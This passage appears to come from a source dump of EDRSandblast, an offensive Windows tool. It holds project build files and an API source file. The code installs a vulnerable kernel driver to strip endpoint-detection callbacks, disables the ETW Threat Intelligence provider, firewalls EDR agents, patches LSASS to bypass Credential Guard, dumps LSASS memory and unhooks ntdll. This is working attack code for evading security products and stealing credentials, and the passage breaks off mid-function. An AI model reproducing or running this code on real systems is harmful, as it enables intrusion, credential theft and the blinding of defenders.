    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
      <AdditionalLibraryDirectories>$(OutDir);%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
      <IgnoreSpecificDefaultLibraries>libcmtd.lib</IgnoreSpecificDefaultLibraries>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
      <AdditionalLibraryDirectories>$(OutDir);%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
      <IgnoreSpecificDefaultLibraries>libcmtd.lib</IgnoreSpecificDefaultLibraries>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="EDRSandblast_LsassDump.c" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`EDRSandblast_LsassDump/EDRSandblast_LsassDump.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="EDRSandblast_LsassDump.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`EDRSandblast_StaticLibrary/EDRSandblast_API.c`:

```c
#include <Windows.h>
#include <shlwapi.h>

#include "../EDRSandblast/EDRSandblast.h"
#include "../EDRSandblast/Includes/CredGuard.h"
#include "../EDRSandblast/Includes/DriverOps.h"
#include "../EDRSandblast/Includes/ETWThreatIntel.h"
#include "../EDRSandblast/Includes/FileUtils.h"
#include "../EDRSandblast/Includes/Firewalling.h"
#include "../EDRSandblast/Includes/KernelCallbacks.h"
#include "../EDRSandblast/Includes/KernelMemoryPrimitives.h"
#include "../EDRSandblast/Includes/ProcessDump.h"
#include "../EDRSandblast/Includes/ProcessDumpDirectSyscalls.h"
#include "../EDRSandblast/Includes/NtoskrnlOffsets.h"
#include "../EDRSandblast/Includes/ObjectCallbacks.h"
#include "../EDRSandblast/Includes/RunAsPPL.h"
#include "../EDRSandblast/Includes/Syscalls.h"
#include "../EDRSandblast/Includes/UserlandHooks.h"
#include "../EDRSandblast/Includes/WdigestOffsets.h"
#include "EDRSandblast_API.h"

// A passer dans le core?
EDRSB_STATUS _InstallVulnerableDriver(EDRSB_CONTEXT* ctx) {
    EDRSB_CONFIG* config = ctx->config;

    WCHAR currentFolderPath[MAX_PATH] = { 0 };
    GetCurrentDirectoryW(_countof(currentFolderPath), currentFolderPath);

    /*
    * Setup the driver path
    */
    WCHAR driverPath[MAX_PATH] = { 0 };
    WCHAR driverDefaultName[] = DEFAULT_DRIVER_FILE;
    if (config->vulerableDriverPath == NULL) {
        WCHAR separator[] = L"\\";
        wcsncat_s(driverPath, _countof(driverPath), currentFolderPath, _countof(currentFolderPath));
        wcsncat_s(driverPath, _countof(driverPath), separator, _countof(separator));
        wcsncat_s(driverPath, _countof(driverPath), driverDefaultName, _countof(driverDefaultName));
    }
    else {
        wcscat_s(driverPath, _countof(driverPath), config->vulerableDriverPath);
    }
    if (!FileExistsW(driverPath)) {
        _tprintf_or_not(TEXT("[!] Required driver file not present at %s\n"), driverPath);
        return EDRSB_DRIVER_NOT_FOUND;
    }
    config->vulerableDriverPath = _wcsdup(driverPath);

    /*
    * Actually installs the driver
    */
    LPTSTR serviceNameIfAny = NULL;
    BOOL isDriverAlreadyRunning = IsDriverServiceRunning(config->vulerableDriverPath, &serviceNameIfAny);
    if (isDriverAlreadyRunning) {
        _putts_or_not(TEXT("[+] Vulnerable driver was already installed"));
        SetDriverServiceName(serviceNameIfAny);
    }
    else {
        _putts_or_not(TEXT("[+] Installing vulnerable driver..."));
        BOOL status = InstallVulnerableDriver(config->vulerableDriverPath);
        if (status != TRUE) {
            _putts_or_not(TEXT("[!] An error occurred while installing the vulnerable driver"));
            _putts_or_not(TEXT("[*] Uninstalling the service and attempting the install again..."));
            Sleep(20000);
            CloseDriverHandle();
            status = UninstallVulnerableDriver();
            Sleep(2000);
            status = status && InstallVulnerableDriver(config->vulerableDriverPath);
            Sleep(2000);
            if (status != TRUE) {
                _putts_or_not(TEXT("[!] New uninstall / install attempt failed, make sure that there is no trace of the driver left..."));
                return EDRSB_DRIVER_INSTALL_FAILED;
            }
        }
        Sleep(5000);// TODO : replace by a reliable method to check if the driver is ready
    }
    _putts_or_not(TEXT("\n"));
    return EDRSB_SUCCESS;
}

// A passer dans le core?
EDRSB_STATUS _LoadNtosKrnlOffsets(EDRSB_CONTEXT* ctx) {
    EDRSB_CONFIG* config = ctx->config;
    
    EDRSB_STATUS status;
    BOOL offsetsLoaded = FALSE;

    if (ctx->config->offsetRetrievalMethod.Embeded) {
        /* TODO */
    }

    if (!offsetsLoaded && ctx->config->offsetRetrievalMethod.File) {
        WCHAR ntoskrnlOffsetCSVPath[MAX_PATH] = { 0 };

        WCHAR currentFolderPath[MAX_PATH] = { 0 };
        GetCurrentDirectoryW(_countof(currentFolderPath), currentFolderPath);

        if (config->kernelOffsetFilePath == NULL) {
            WCHAR offsetCSVName[] = L"\\NtoskrnlOffsets.csv";
            wcsncat_s(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
            wcsncat_s(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), offsetCSVName, _countof(offsetCSVName));
        }
        else {
            wcscat_s(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), config->kernelOffsetFilePath);
        }

        if (!FileExistsW(ntoskrnlOffsetCSVPath)) {
            _tprintf_or_not(TEXT("[!] Kernel offsets file not present at %s\n"), ntoskrnlOffsetCSVPath);
            config->kernelOffsetFilePath = NULL;
        }

        else {
            _putts_or_not(TEXT("[+] Loading kernel related offsets from the CSV file"));
            config->kernelOffsetFilePath = _wcsdup(ntoskrnlOffsetCSVPath);
            LoadNtoskrnlOffsetsFromFile(config->kernelOffsetFilePath);
            if (!NtoskrnlNotifyRoutinesOffsetsArePresent()) { // (only check notify routines offsets, because ETW Ti might legitimately be absent on "old" Windows versions)
                _putts_or_not(TEXT("[!] Kernel offsets are missing from the CSV for the version of ntoskrnl in use."));
            }
            else {
                _putts_or_not(TEXT("[+] Kernel offsets were loaded from the CSV file for the version of ntoskrnl in use."));
                offsetsLoaded = TRUE;
            }
        }
    }

    if (!offsetsLoaded && ctx->config->offsetRetrievalMethod.Internet) {
        _putts_or_not(TEXT("[+] Downloading kernel offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
        LoadNtoskrnlOffsetsFromInternet(FALSE);
        
        if (!NtoskrnlNotifyRoutinesOffsetsArePresent()) {
            _putts_or_not(TEXT("[-] Downloading kernel offsets from the internet failed!"));
        }
        
        else {
            _putts_or_not(TEXT("[+] Downloading kernel offsets succeeded!"));
            offsetsLoaded = TRUE;
        }
    }

    if (!offsetsLoaded) {
        _putts_or_not(TEXT("[!] The kernel offsets required couldn't be retrieve using any of the methods specified\n"));
        status = EDRSB_KERNEL_OFFSETS_NOT_FOUND;
    }
    else {
        status = EDRSB_SUCCESS;
    }

    return status;
}

// A passer dans le core?
EDRSB_STATUS _LoadWdigestOffsets(EDRSB_CONTEXT* ctx) {
    EDRSB_CONFIG* config = ctx->config;

    EDRSB_STATUS status;
    BOOL offsetsLoaded = FALSE;

    if (ctx->config->offsetRetrievalMethod.Embeded) {
        /* TODO */
    }

    if (!offsetsLoaded && ctx->config->offsetRetrievalMethod.File) {
        WCHAR wdigestOffsetCSVPath[MAX_PATH] = { 0 };

        WCHAR currentFolderPath[MAX_PATH] = { 0 };
        GetCurrentDirectoryW(_countof(currentFolderPath), currentFolderPath);

        if (config->wdigestOffsetFilePath == NULL) {
            WCHAR offsetCSVName[] = L"\\WdigestOffsets.csv";
            wcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
            wcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), offsetCSVName, _countof(offsetCSVName));
        }
        else {
            wcscat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), config->wdigestOffsetFilePath);
        }

        if (!FileExistsW(wdigestOffsetCSVPath)) {
            _tprintf_or_not(TEXT("[!] Wdigest offsets file not present at %s\n"), wdigestOffsetCSVPath);
            config->wdigestOffsetFilePath = NULL;
        }
        else {
            _putts_or_not(TEXT("[+] Loading wdigest related offsets from the CSV file"));
            config->wdigestOffsetFilePath = wdigestOffsetCSVPath;
            LoadWdigestOffsetsFromFile(config->wdigestOffsetFilePath);
            if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
                _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of wdigest in use."));
            }
            else {
                _putts_or_not(TEXT("[+] Wdigest offsets were loaded from the CSV file for the version of wdigest in use."));
                offsetsLoaded = TRUE;
            }
        }
    }

    if (!offsetsLoaded && ctx->config->offsetRetrievalMethod.Internet) {
        _putts_or_not(TEXT("[+] Downloading wdigest offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
        LoadWdigestOffsetsFromInternet(FALSE);

        if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
            _putts_or_not(TEXT("[-] Downloading wdigest offsets from the internet failed!"));
        }

        else {
            _putts_or_not(TEXT("[+] Downloading wdigest offsets succeeded!"));
            offsetsLoaded = TRUE;
        }
    }

    if (!offsetsLoaded) {
        _putts_or_not(TEXT("[!] The wdigest offsets required couldn't be retrieve using any of the methods specified\n"));
        status = EDRSB_WDIGEST_OFFSETS_NOT_FOUND;
    }
    else {
        status = EDRSB_SUCCESS;
    }

    return status;
}

EDRSB_STATUS EDRSB_Init(_Out_ EDRSB_CONTEXT* ctx, _In_ EDRSB_CONFIG* config) {
    EDRSB_STATUS status;
    BOOL driverInstallRequired = FALSE;
    BOOL kernelOffsetsLoaded = FALSE;
    ctx->config = config;

    if (config->actions.ProtectProcess) {
        config->bypassMode.Krnlmode = 1;
    }

    // Check that the parameters are valid for BypassMode krnlmode.
    if (config->bypassMode.Krnlmode) {
        status = _LoadNtosKrnlOffsets(ctx);
        if (status != EDRSB_SUCCESS) {
            _tprintf_or_not(TEXT("[-] Init failed: required offsets for kernel operations couldn't be loaded (error 0x%lx)!\n"), status);
            return status;
        }
        else {
            kernelOffsetsLoaded = TRUE;
        }

        driverInstallRequired = TRUE;
    }

    // Check that the parameters are valid for BypassMode Usermode.
    if (config->bypassMode.Usermode) {
        /* No pre-requiste yet */
    }

    if (config->actions.ProtectProcess) {
        if (g_ntoskrnlOffsets.st.eprocess_protection == 0x0) {
            _putts_or_not(TEXT("[-] Init failed: missing the _PS_PROTECTION offset, cannot set process as Protected"));
            return EDRSB_KERNEL_OFFSETS_NOT_FOUND;
        }

        driverInstallRequired = TRUE;
    }

    if (config->actions.BypassCredguard) {
        status = _LoadWdigestOffsets(ctx);
        if (status != EDRSB_SUCCESS) {
            _tprintf_or_not(TEXT("[-] Init failed: required offsets for CredentialGuard bypass couldn't be loaded (error 0x%lx)!\n"), status);
            return status;
        }
    }

    if (driverInstallRequired) {
        status = _InstallVulnerableDriver(ctx);
        if (status != EDRSB_SUCCESS) {
            _tprintf_or_not(TEXT("[-] Init failed: driver couldn't be installed (error 0x%lx)!\n"), status);
            return status;
        }

        ctx->isDriverInstalled = TRUE;
    }

    return EDRSB_SUCCESS;
}

EDRSB_STATUS Krnlmode_EnumAllMonitoring(_In_opt_ EDRSB_CONTEXT* ctx) {
    if (ctx && !ctx->config->bypassMode.Krnlmode) {
        _tprintf_or_not(TEXT("[-] Krnlmode operation failed: missing Krnlmode mode in config"));
        return EDRSB_MISSING_KRNLMODE;
    }

    EDRSB_STATUS status;

    struct FOUND_EDR_CALLBACKS* foundEDRDrivers = NULL;
    BOOL isSafeToExecutePayload = TRUE;
    BOOL foundNotifyRoutineCallbacks;
    BOOL foundObjectsCallbacks;
    BOOL isETWTICurrentlyEnabled;

    BOOL verbose = ctx ? ctx->config->verbose : FALSE;

    if (ctx) {
        _putts_or_not(TEXT("[+] Checking if any EDR Kernel callbacks are configured..."));
    }

    foundEDRDrivers = (struct FOUND_EDR_CALLBACKS*)calloc(1, sizeof(struct FOUND_EDR_CALLBACKS));
    if (!foundEDRDrivers) {
        _putts_or_not(TEXT("[!] Couldn't allocate memory to enumerate the drivers in Kernel callbacks"));
        return EDRSB_MEMALLOC_FAIL;
    }

    if (ctx) {
        _putts_or_not(TEXT("[+] Check if EDR callbacks are registered on process / thread creation & image loading"));
    }
    foundNotifyRoutineCallbacks = EnumEDRNotifyRoutineCallbacks(foundEDRDrivers, verbose);
    if (ctx && foundNotifyRoutineCallbacks) {
        ctx->foundNotifyRoutineCallbacks = TRUE;
    }
    if (ctx) {
        _tprintf_or_not(TEXT("[+] Object callbacks have %sbeen found"), ctx->foundNotifyRoutineCallbacks ? TEXT("") : TEXT("NOT"));
        _putts_or_not(TEXT("[+] Check if EDR callbacks are registered on processes and threads handle creation/duplication"));
    }

    foundObjectsCallbacks = EnumEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
    if (ctx && foundObjectsCallbacks) {
        ctx->foundObjectCallbacks = TRUE;
    }
    if (ctx) {
        _tprintf_or_not(TEXT("[+] Enabled EDR object callbacks are %s !\n"), ctx->foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
    }

    if (ctx) {
        ctx->foundEDRDrivers = foundEDRDrivers;
        _putts_or_not(TEXT("[+] Check the ETW Threat Intelligence Provider state"));
    }
    else {
        free(foundEDRDrivers);
        foundEDRDrivers = NULL;
    }

    isETWTICurrentlyEnabled = isETWThreatIntelProviderEnabled(verbose);
    if (ctx && isETWTICurrentlyEnabled) {
        ctx->isETWTICurrentlyEnabled = TRUE;
    }

    if (ctx) {
        ctx->isETWTISystemEnabled |= ctx->isETWTICurrentlyEnabled;
        _tprintf_or_not(TEXT("[+] ETW Threat Intelligence Provider is %s!\n\n"), ctx->isETWTISystemEnabled ? TEXT("ENABLED") : TEXT("DISABLED"));
        ctx->krnlmodeMonitoringEnumDone = TRUE;
    }

    if (foundNotifyRoutineCallbacks || foundObjectsCallbacks || isETWTICurrentlyEnabled) {
        status = EDRSB_KNRL_MONITORING;
    }
    else {
        status = EDRSB_SUCCESS;
    }

    return status;
}

EDRSB_STATUS Krnlmode_RemoveAllMonitoring(_In_ EDRSB_CONTEXT* ctx) {
    if (!ctx->config->bypassMode.Krnlmode) {
        _tprintf_or_not(TEXT("[-] Krnlmode operation failed: missing Krnlmode mode in config"));
        return EDRSB_MISSING_KRNLMODE;
    }

    EDRSB_STATUS status;

    if (!ctx->krnlmodeMonitoringEnumDone) {
        status = Krnlmode_EnumAllMonitoring(ctx);
        if (status != EDRSB_KNRL_MONITORING) {
            return status;
        }
    }

    if (ctx->foundNotifyRoutineCallbacks) {
        _putts_or_not(TEXT("[+] Removing kernel callbacks registered by EDR for process creation, thread creation and image loading..."));
        // TODO Disable <-> Remove.
        RemoveEDRNotifyRoutineCallbacks(ctx->foundEDRDrivers);
    }

    if (ctx->foundObjectCallbacks) {
        _putts_or_not(TEXT("[+] Disabling kernel callbacks registered by EDR for process and thread opening or handle duplication..."));
        // TODO Disable <-> Remove.
        DisableEDRProcessAndThreadObjectsCallbacks(ctx->foundEDRDrivers);
    }

    if (ctx->isETWTICurrentlyEnabled) {
        DisableETWThreatIntelProvider(ctx->config->verbose);
        ctx->isETWTICurrentlyEnabled = FALSE;
        _putts_or_not(TEXT(""));
    }

    return Krnlmode_EnumAllMonitoring(NULL);
}

EDRSB_STATUS Krnlmode_RestoreAllMonitoring(_In_ EDRSB_CONTEXT* ctx) {
    if (!ctx->krnlmodeMonitoringEnumDone) {
        _putts(TEXT("[-] Kernel mode callbacks were not enumerated prior to this call"));
        return EDRSB_FAILURE;
    }

    if (!ctx->config->actions.DontRestoreCallBacks && ctx->foundNotifyRoutineCallbacks) {
        _putts_or_not(TEXT("Restoring EDR's kernel notify routine callbacks..."));
        RestoreEDRNotifyRoutineCallbacks(ctx->foundEDRDrivers);
    }

    if (!ctx->config->actions.DontRestoreCallBacks && ctx->foundObjectCallbacks) {
        _putts_or_not(TEXT("[+] Restoring EDR's kernel object callbacks..."));
        EnableEDRProcessAndThreadObjectsCallbacks(ctx->foundEDRDrivers);
    }

    // Renable the ETW Threat Intel provider.
    if (!ctx->config->actions.DontRestoreETWTI && ctx->isETWTISystemEnabled) {
        EnableETWThreatIntelProvider(ctx->config->verbose);
    }

    if (ctx->foundEDRDrivers) {
        free(ctx->foundEDRDrivers);
        ctx->foundEDRDrivers = NULL;
    }

    ctx->krnlmodeMonitoringEnumDone = FALSE;

    return EDRSB_SUCCESS;
}

EDRSB_STATUS Action_SetCurrentProcessAsProtected(_In_ EDRSB_CONTEXT* ctx) {
    if (!ctx->config->actions.ProtectProcess) {
        _tprintf_or_not(TEXT("[-] Protecting of process failed: missing ProtectProcess action in config"));
        return EDRSB_MISSING_PROTECTPROCESS;
    }

    _putts_or_not(TEXT("[+] Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light)."));
    SetCurrentProcessAsProtected(ctx->config->verbose);
    return EDRSB_SUCCESS;
}

//TODO : remove, this API serves no purpose. Just expose SandMiniDumpWriteDump (with a userland bypass technique as parameter), and use GetSafeNtFunction inside SandMiniDumpWriteDump
EDRSB_STATUS Action_DumpProcessByName(_In_ EDRSB_CONTEXT* ctx, _In_ LPWSTR processName, _In_ LPWSTR outputPath, EDRSB_USERMODE_TECHNIQUE usermodeTechnique) {
    EDRSB_CONFIG* config = ctx->config;

    EDRSB_STATUS status;
    DWORD ntStatus;

    if (usermodeTechnique != -1) {
        ntStatus = SandMiniDumpWriteDump(processName, outputPath);// , usermodeTechnique);
        if (ntStatus != STATUS_SUCCES) {
            _tprintf_or_not(TEXT("[-] Process dump failed: direct syscall MiniDumpWriteDump failed with error 0x%lx!\n"), ntStatus);
            status = EDRSB_FAILURE;
        }
        else {
            status = EDRSB_SUCCESS;
        }
    }

    else {
        ntStatus = dumpProcess(processName, outputPath);
        if (!ntStatus) {
            _tprintf_or_not(TEXT("[-] Process dump failed: Lsass dump using Windows' MiniDumpWriteDump failed!"));
            status = EDRSB_FAILURE;
        }
        else {
            status = EDRSB_FAILURE;
        }
    }

    return status;
}


EDRSB_STATUS Action_FirewallBlockEDR(_In_ EDRSB_CONTEXT* ctx) {
    if (!ctx->config->actions.FirewallEDR) {
        _tprintf_or_not(TEXT("[-] Firewalling failed: missing FirewallEDR action in config"));
        return EDRSB_MISSING_FIREWALLEDR;
    }

    EDRSB_STATUS status;
    HRESULT hrStatus = S_OK;

    fwBlockingRulesList sFWEntries = { 0 };

    _tprintf_or_not(TEXT("[*] Configuring Windows Firewall rules to block EDR network access...\n\n"));

    hrStatus = FirewallBlockEDR(&sFWEntries);
    if (FAILED(hrStatus)) {
        _tprintf_or_not(TEXT("[!] An error occured while attempting to create Firewall rules!\n\n"));
        status = EDRSB_FAILURE;
    }
    else {
        _tprintf_or_not(TEXT("[+] Successfully configured Windows Firewall rules to block EDR network access!\n"));
        status = EDRSB_FAILURE;
        FirewallPrintManualDeletion(&sFWEntries);
    }

    return status;
}

EDRSB_STATUS Action_DisableCredGuard(_In_ EDRSB_CONTEXT* ctx) {
    if (!ctx->config->actions.BypassCredguard) {
        _tprintf_or_not(TEXT("[-] CredGuard bypass failed: missing BypassCredguard action in config"));
        return EDRSB_FAILURE;
    }

    EDRSB_STATUS status;
    
    if (disableCredGuardByPatchingLSASS()) {
        _putts_or_not(TEXT("[+] LSASS was patched and Credential Guard should be bypassed for future logins on the system."));
        status = EDRSB_SUCCESS;
    }
    else {
        _putts_or_not(TEXT("[!] LSASS couldn't be patched and Credential Guard will not be bypassed."));
        status = EDRSB_BYPASSCREDGUARD_FAILED;
    }

    return status;

}

VOID Usermode_EnumAllMonitoring(_Inout_ EDRSB_CONTEXT* ctx) {
    // zero-terminated HOOK array
    HOOK* hooks = searchHooks(NULL);
    ctx->foundUserlandHooks = hooks;
}

VOID Usermode_RemoveAllMonitoring(_Inout_ EDRSB_CONTEXT* ctx, EDRSB_USERMODE_TECHNIQUE technique) {
    UNHOOK_METHOD map_methods[5] = { 0 }; //maps EDRSB_USERMODE_TECHNIQUE enum with UNHOOK_METHOD enum
    map_methods[EDRSB_UMTECH_Unhook_with_ntdll_NtProtectVirtualMemory] = UNHOOK_WITH_NTPROTECTVIRTUALMEMORY;
    map_methods[EDRSB_UMTECH_Copy_ntdll_and_load] = UNHOOK_WITH_DUPLICATE_NTPROTECTVIRTUALMEMORY;
    map_methods[EDRSB_UMTECH_Allocate_trampoline] = UNHOOK_WITH_INHOUSE_NTPROTECTVIRTUALMEMORY_TRAMPOLINE;
    map_methods[EDRSB_UMTECH_Find_and_use_existing_trampoline] = UNHOOK_WITH_EDR_NTPROTECTVIRTUALMEMORY_TRAMPOLINE;
    map_methods[EDRSB_UMTECH_Use_direct_syscall] = UNHOOK_WITH_DIRECT_SYSCALL;
    UNHOOK_METHOD unhook_method = map_methods[technique];

    if (!ctx->foundUserlandHooks) {
        Usermode_EnumAllMonitoring(ctx);
    }

    HOOK* hooks = ctx->foundUserlandHooks;
    if (!hooks) {
        _putts_or_not(TEXT("[-] Failed to get userland hooks\n"));
        return;
    }

    if (hooks->disk_function != NULL) {
        _putts_or_not(TEXT("[+] Removing detected userland hooks:\n"));
    }

    for (HOOK* ptr = hooks; ptr->disk_function != NULL; ptr++) {
        printf_or_not("\tUnhooking %s using method %ld...\n", ptr->functionName, unhook_method);
        unhook(ptr, unhook_method);
    }
}

EDRSB_STATUS _Usermode_GetSafeNtFunction_with_ntdll_copy(_Inout_ EDRSB_CONTEXT* ctx, _In_z_ const WCHAR* tempDLLFilePath, _In_z_ LPCSTR ntFunctionName, _Outptr_result_maybenull_ PVOID* function);
EDRSB_STATUS _GetSafeNtFunctionUsingTrampoline(BOOL fromEdr, LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function);
EDRSB_STATUS _GetSafeNtFunctionbyUnhookingWithNtProtectVirtualMemory(_In_ LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function);
EDRSB_STATUS Usermode_GetSafeNtFunc(_Inout_ EDRSB_CONTEXT* ctx, _In_ LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function, EDRSB_USERMODE_TECHNIQUE technique) {
    WCHAR tempDLLFilePath[MAX_PATH] = { 0 };
    switch (technique) {
    case EDRSB_UMTECH_Copy_ntdll_and_load:
        GetTempPathW(MAX_PATH, tempDLLFilePath);
        PathCombineW(tempDLLFilePath, tempDLLFilePath, L"ntdlol.txt");//TODO : make it configurable
        return _Usermode_GetSafeNtFunction_with_ntdll_copy(ctx, tempDLLFilePath, functionName, function);
    case EDRSB_UMTECH_Allocate_trampoline:
        return _GetSafeNtFunctionUsingTrampoline(FALSE, functionName, function);
    case EDRSB_UMTECH_Find_and_use_existing_trampoline:
        return _GetSafeNtFunctionUsingTrampoline(TRUE, functionName, function);
    case EDRSB_UMTECH_Unhook_with_ntdll_NtProtectVirtualMemory:
        return _GetSafeNtFunctionbyUnhookingWithNtProtectVirtualMemory(functionName, function);
    case EDRSB_UMTECH_Use_direct_syscall:
        *function = CreateSyscallStubWithVirtuallAlloc(functionName);
        if (*function) {
            return EDRSB_SUCCESS;
        }
        else {
            return EDRSB_FAILURE;
        }
    default:
        *function = NULL;
        return EDRSB_FAILURE;
    }
}

/*
* Patch the ntdll section that corresponds to the asked function, replace it with its original content, and just return a poniter to the function address in ntdll.dll
* The following actions are performed:
* - The export that immediately follows the asked function is located, and will be considered as the function boundary
* - The content of the function is copied from the on-disk version of ntdll.dll (after taking relocations into account), to the memory-mapped version
*/
EDRSB_STATUS _GetSafeNtFunctionbyUnhookingWithNtProtectVirtualMemory(_In_ LPCSTR functionName, _Outptr_result_maybenull_ PVOID* function) {
    *function = NULL;

    // Get ntdll.dll from memory and disk
    PE* ntdll_mem = NULL;
    PE* ntdll_disk = NULL;
    getNtdllPEs(&ntdll_mem, &ntdll_disk);

    // Look for the closest export from "function"
    DWORD functionRVA = PE_functionRVA(ntdll_disk, functionName);
    if (functionRVA) {
        return EDRSB_NT_FUNCTION_NOT_FOUND;
    }
    DWORD nextFunctionRVA = functionRVA - 1;
    for (DWORD i = 0; i < ntdll_disk->exportedNamesLength; i++) {
        DWORD someFunctionStartRVA = ntdll_disk->exportedFunctions[ntdll_disk->exportedOrdinals[i]];
        if (someFunctionStartRVA == functionRVA) {
            continue;
        }
        if ((someFunctionStartRVA - functionRVA) < (nextFunctionRVA - functionRVA)) {
            nextFunctionRVA = someFunctionStartRVA;
        }
    }
    
    // Check we did not cross a section boundary (last export in the section)
    IMAGE_SECTION_HEADER* textSection = PE_sectionHeader_fromRVA(ntdll_disk, functionRVA);
    DWORD textSectionEndRVA = textSection->VirtualAddress + textSection->Misc.VirtualSize;
    if (textSectionEndRVA < nextFunctionRVA) {
        nextFunctionRVA = textSectionEndRVA;
    }

    // The area to patch is between the two bounds
    PVOID functionStart = PE_RVA_to_Addr(ntdll_mem, functionRVA);
    PVOID functionEnd = PE_RVA_to_Addr(ntdll_mem, nextFunctionRVA);
    SIZE_T functionSize = (PBYTE)functionEnd - (PBYTE)functionStart;
    PVOID functionStartOnDisk = PE_RVA_to_Addr(ntdll_disk, functionRVA);

    // Use NtProtectVirtualMemory to temporarily change page permissions and patch it with disk content
